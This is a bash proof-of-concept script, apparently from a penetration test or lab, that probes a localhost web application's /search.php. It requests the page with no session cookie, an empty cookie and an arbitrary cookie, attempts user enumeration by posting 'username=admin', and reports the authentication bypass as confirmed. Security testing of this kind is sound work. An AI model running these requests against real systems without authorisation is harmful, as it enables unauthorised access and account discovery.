#!/bin/bash

# POC: Authentication Bypass - Search Functionality Accessible Without Authentication
# This script demonstrates that /search.php is accessible without a valid authenticated session

TARGET_URL="http://localhost:8080"
SEARCH_ENDPOINT="$TARGET_URL/search.php"

echo "========================================"
echo "Authentication Bypass POC - Search Endpoint"
echo "========================================"
echo ""

# Test 1: Access search.php without any session cookie
echo "[TEST 1] Accessing /search.php without session cookie (no authentication)"
echo "Request: curl -s -i '$SEARCH_ENDPOINT'"
echo ""
RESPONSE=$(curl -s -i "$SEARCH_ENDPOINT" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP" | head -1)
BODY=$(echo "$RESPONSE" | tail -n +$(echo "$RESPONSE" | grep -n "^$" | head -1 | cut -d: -f1 | xargs expr 1 +))

echo "Response Status: $HTTP_CODE"
echo ""
echo "Response Body:"
echo "$BODY"
echo ""

# Check if success message appears
if echo "$BODY" | grep -q "You are connected successfully"; then
    echo "✓ VULNERABLE: Unauthenticated access granted!"
    echo "✓ Application treats user as authenticated without valid session"
    VULN_CONFIRMED=1
else
    echo "✗ Access denied or redirected to login"
fi
echo ""

# Test 2: Access with empty/invalid session cookie
echo "[TEST 2] Accessing /search.php with empty session cookie"
echo "Request: curl -s -i -b 'PHPSESSID=' '$SEARCH_ENDPOINT'"
echo ""
RESPONSE=$(curl -s -i -b "PHPSESSID=" "$SEARCH_ENDPOINT" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP" | head -1)
BODY=$(echo "$RESPONSE" | tail -n +$(echo "$RESPONSE" | grep -n "^$" | head -1 | cut -d: -f1 | xargs expr 1 +))

echo "Response Status: $HTTP_CODE"
if echo "$BODY" | grep -q "You are connected successfully"; then
    echo "✓ VULNERABLE: Access granted with empty session cookie"
fi
echo ""

# Test 3: User enumeration attempt via search parameter (demonstrates consequence)
echo "[TEST 3] Attempting user enumeration - search for 'admin' user"
echo "Request: curl -s -X POST '$SEARCH_ENDPOINT' -d 'username=admin'"
echo ""
RESPONSE=$(curl -s -X POST "$SEARCH_ENDPOINT" -d "username=admin" 2>&1)

echo "Response:"
echo "$RESPONSE"
echo ""

if echo "$RESPONSE" | grep -q "User exists: admin"; then
    echo "✓ VULNERABLE: User enumeration successful without authentication"
    VULN_CONFIRMED=1
fi
echo ""

# Test 4: Access with arbitrary/invalid session ID
echo "[TEST 4] Accessing with arbitrary session ID (not set on server)"
echo "Request: curl -s -i -b 'PHPSESSID=fixed_session_id_12345' '$SEARCH_ENDPOINT'"
echo ""
RESPONSE=$(curl -s -i -b "PHPSESSID=fixed_session_id_12345" "$SEARCH_ENDPOINT" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP" | head -1)
BODY=$(echo "$RESPONSE" | tail -n +$(echo "$RESPONSE" | grep -n "^$" | head -1 | cut -d: -f1 | xargs expr 1 +))

echo "Response Status: $HTTP_CODE"
if echo "$BODY" | grep -q "You are connected successfully"; then
    echo "✓ VULNERABLE: Access granted with arbitrary session ID (no server-side validation)"
fi
echo ""

echo "========================================"
if [ "$VULN_CONFIRMED" = "1" ]; then
    echo "RESULT: CRITICAL - Authentication Bypass Confirmed"
    echo "The /search.php endpoint is accessible without valid authentication"
    exit 0
else
    echo "RESULT: Could not confirm vulnerability"
    exit 1
fi